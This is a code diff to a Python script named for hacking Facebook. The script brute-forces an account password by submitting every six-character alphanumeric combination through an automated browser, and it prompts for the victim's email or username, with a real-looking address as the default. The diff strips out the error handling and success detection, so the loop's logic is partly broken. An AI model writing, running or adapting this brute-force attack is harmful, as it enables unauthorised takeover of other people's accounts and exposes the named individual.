@@ -61,33 +61,26 @@ def fb_hack(email, codex):
   browser.select_form(nr=0)
   for combination in  itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
     x = (''.join(map(str, combination)))
-    try:
-      x = (''.join(map(str, combination)))
-      browser.form['pass'] = x
-      browser.submit()
-      test1 = (x, " Failed")
-      test2 = (x, " Succeded")
-      counter += 1
-      yo = h.join(test1)
-      yo2 = h.join(test2)
-      response1 = browser.response()
-      soup = BeautifulSoup(response1, 'html.parser')
-      check1 = soup.find(string="Try another way")
-      if check1 == check2:
-        print(yo)
-        sleepy(30)
-      else:
-        print("Possible success")
-        print(test2)
-        raise
-    except:
+    browser.form['pass'] = x
+    browser.submit()
+    test1 = (x, " Failed")
+    test2 = (x, " Succeded")
+    counter += 1
+    yo = h.join(test1)
+    yo2 = h.join(test2)
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    check1 = soup.find(string="Try another way")
+    print(yo)
+    sleepy(30)
+    """except:
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
       with open("output1.html", "w") as file:
         file.write(str(soup))
       with open("output1.txt", "w") as file:
         file.write(str(soup))
-      print(counter)
+      print(counter)"""
 
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
